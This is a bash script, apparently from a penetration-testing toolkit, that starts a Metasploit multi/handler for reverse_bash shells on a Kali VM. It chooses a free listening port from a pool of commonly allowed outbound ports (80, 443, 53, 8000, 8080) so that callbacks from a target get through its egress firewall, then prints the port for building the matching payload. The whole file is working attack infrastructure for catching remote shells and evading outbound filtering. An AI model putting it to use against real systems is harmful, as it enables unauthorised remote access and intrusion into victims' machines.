#!/usr/bin/env bash
# Launch an msf multi/handler on the first FREE egress-friendly port in the engagement's tmux
# 'msf' window on the Kali VM. Fixes two failure modes at once:
#   - "address already in use" bind failure (a port in the egress set is already listening), and
#   - the silent no-callback from a random high port the target's egress firewall filters.
# A reverse-shell LPORT is NOT a free choice: it must exit through the target firewall, so we never
# pick a random port -- we pick the first port from the egress-allowed pool that is free on the VM.
# The chosen LPORT is printed (last line) so the caller builds the matching target payload with it.
#
# Usage: bash vm-handler.sh <eng> <lhost> [payload]      (payload default: cmd/unix/reverse_bash)
#        bash vm-handler.sh --selftest
# Env:   EGRESS_PORTS (default "80 443 53 8000 8080"), VM_SH (default /root/vm.sh)
set -uo pipefail

EGRESS_PORTS="${EGRESS_PORTS:-80 443 53 8000 8080}"

# pick_free_port <bound-ports>: first EGRESS_PORTS entry not in the (space-delimited) bound list.
pick_free_port() {
  local bound=" ${1:-} "
  local p
  for p in $EGRESS_PORTS; do
    case "$bound" in *" $p "*) continue;; esac
    printf '%s\n' "$p"; return 0
  done
  return 1
}

if [ "${1:-}" = "--selftest" ]; then
  [ "$(pick_free_port '443')" = "80" ] || { echo "FAIL: 443 bound -> want 80"; exit 1; }
  [ "$(EGRESS_PORTS='80 443 53' pick_free_port '80 443')" = "53" ] || { echo "FAIL: want 53"; exit 1; }
  if pick_free_port '80 443 53 8000 8080' >/dev/null; then echo "FAIL: all bound should error"; exit 1; fi
  echo "selftest ok"; exit 0
fi

ENG="${1:?need <eng>}"; LHOST="${2:?need <lhost>}"; PAYLOAD="${3:-cmd/unix/reverse_bash}"
VM_SH="${VM_SH:-/root/vm.sh}"
VAULT="$(cd "$(dirname "$0")/.." && pwd)"

# ports already listening on the VM (any interface) -> the bound set
BOUND="$(bash "$VM_SH" "ss -tlnH 2>/dev/null | awk '{print \$4}' | sed 's/.*://' | sort -un | tr '\n' ' '")"
LPORT="$(pick_free_port "$BOUND")" || {
  echo "no free egress port in [$EGRESS_PORTS] (bound on VM: $BOUND)" >&2; exit 1; }

echo "handler: LPORT=$LPORT payload=$PAYLOAD LHOST=$LHOST (egress-friendly, free on VM)" >&2
bash "$VAULT/scripts/vm-scan.sh" --win msf "$ENG" "$LHOST" \
  "msfconsole -q -x \"use exploit/multi/handler; set payload $PAYLOAD; set LHOST $LHOST; set LPORT $LPORT; set ExitOnSession false; run -j\"" >&2

printf '%s\n' "$LPORT"
